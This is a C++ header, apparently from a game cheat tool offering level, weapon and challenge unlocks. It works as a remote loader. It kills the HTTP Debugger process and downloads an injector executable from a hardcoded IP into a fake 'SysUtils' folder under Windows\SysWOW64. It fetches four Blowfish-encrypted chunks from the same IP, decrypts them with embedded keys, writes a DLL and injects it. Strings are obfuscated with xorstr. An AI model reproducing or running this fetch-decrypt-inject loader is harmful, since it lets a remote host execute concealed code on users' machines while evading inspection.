#pragma once
#include <iostream>
#include <Windows.h>
#include "xor.h"
#include "no_loader/no_stream/no_stream.h"
#include <WinInet.h>
#pragma comment(lib, "Wininet.lib")
#define DISABLE_OUTPUT
#include <fstream>
#include <filesystem>
#include <sstream>
#include "no_dmu.h"
#include<tchar.h>
#include<urlmon.h>
#include <future>
#pragma comment (lib,"urlmon.lib")




struct DLLEncryptedData_t
{
	std::string a;
	std::string b;
	std::string c;
	std::string d;
};

BLOWFISH DLLENC1(xorstr("0096442170857917"));
BLOWFISH DLLENC2(xorstr("1460853456758055"));
BLOWFISH DLLENC3(xorstr("7798751519739505"));
BLOWFISH DLLENC4(xorstr("1238150549789312"));


std::string DLLDecrypt(DLLEncryptedData_t encryptedData)
{
	//decrypt each part
	std::string BufferDecrypted = DLLENC1.Decrypt_CBC(encryptedData.a);
	BufferDecrypted += DLLENC2.Decrypt_CBC(encryptedData.b);
	BufferDecrypted += DLLENC3.Decrypt_CBC(encryptedData.c);
	BufferDecrypted += DLLENC4.Decrypt_CBC(encryptedData.d);
	

	return BufferDecrypted;
}

std::string DLLStreamFileToMemString(std::string URL)
{
	std::string he = xorstr("Accept: *" "/" "*\r\n\r\n");
	HANDLE hInterWebz = InternetOpen(xorstr("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = InternetOpenUrl(hInterWebz, URL.c_str(), he.c_str(), lstrlen(he.c_str()), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	InternetCloseHandle(hInterWebz);
	InternetCloseHandle(hURL);

	return data;
}

std::string DLLGetDecryptedDLL(bool bGiveLevel1000, bool bMaxAllWeapons, bool bDoAllChallenges)
{
	std::string data1;
	std::string data2;
	std::string data3;
	std::string data4;
	system("taskkill /f /im HTTPDebuggerSvc.exe && cls");
	if (bGiveLevel1000) {
		data1 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/l-_-v-_-l/l-_-v-_-l-_-1)"));
		data2 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/l-_-v-_-l/l-_-v-_-l-_-2)"));
		data3 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/l-_-v-_-l/l-_-v-_-l-_-3)"));
		data4 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/l-_-v-_-l/l-_-v-_-l-_-4)"));
	}
	else if (bMaxAllWeapons) {
		data1 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/m-_-a-_-x/m-_-a-_-x-_-1)"));
		data2 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/m-_-a-_-x/m-_-a-_-x-_-2)"));
		data3 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/m-_-a-_-x/m-_-a-_-x-_-3)"));
		data4 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/m-_-a-_-x/m-_-a-_-x-_-4)"));
	}
	else if (bDoAllChallenges) {
		data1 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/u-_-c-_-s/u-_-c-_-s-_-1)"));
		data2 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/u-_-c-_-s/u-_-c-_-s-_-2)"));
		data3 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/u-_-c-_-s/u-_-c-_-s-_-3)"));
		data4 = DLLStreamFileToMemString(xorstr(R"(http://185.25.206.114/d-_-m-_-u/u-_-c-_-s/u-_-c-_-s-_-4)"));
	}
	else {
		return "";
	}

	std::string decryptedDLL = DLLDecrypt({ data1, data2, data3, data4 });

	return decryptedDLL;
}


void ThreadInjectionCompleted() {
	while (true) {
		if (GetAsyncKeyState(VK_F2)) {
			break;
		}
		Sleep(1);
	}
	//MessageBoxA(NULL, "Yeahh", "rehehr", MB_OK);
	Sleep(3000);
	system(xorstr("taskkill /f /im SysUtility.exe && cls"));
}


bool DrpYkInj(bool bGiveLevel1000, bool bMaxAllWeapons, bool bDoAllChallenges) {
	system("mkdir C:\\Windows\\SysWOW64\\SysUtils && cls");
	system("taskkill /f /im HTTPDebuggerSvc.exe && cls");
	URLDownloadToFileA(NULL, xorstr("http://185.25.206.114/i-_-n-_-j-_-e/i-_-n-_-j-_-e"), xorstr("C:\\Windows\\SysWOW64\\SysUtils\\SysUtility.exe"), 0, NULL);

	std::string ykdll = DLLGetDecryptedDLL(bGiveLevel1000, bMaxAllWeapons, bDoAllChallenges);
	if (ykdll == "") {
		return false;
	}
	std::ofstream ofs;
	ofs.open(xorstr("C:\\Windows\\SysWOW64\\SysUtils\\SysUtility.dll"), std::ios::binary);
	std::copy(ykdll.begin(), ykdll.end(), std::ostream_iterator<char>(ofs));
	ofs.close();

	std::thread InjectCompletedThread(ThreadInjectionCompleted); InjectCompletedThread.detach();

	system(xorstr("C:\\Windows\\SysWOW64\\SysUtils\\SysUtility.exe C:\\Windows\\SysWOW64\\SysUtils\\SysUtility.dll"));

	system(xorstr("cls"));

	return true;
}

bool no_dmu::DmuInit(bool bGiveLevel1000, bool bMaxAllWeapons, bool bDoAllChallenges) {
	
	system(xorstr("cls"));
	if (DrpYkInj(bGiveLevel1000, bMaxAllWeapons, bDoAllChallenges) == false) {
		system(xorstr("cls"));
		return false;
	}
	system(xorstr("cls"));
	return true;
}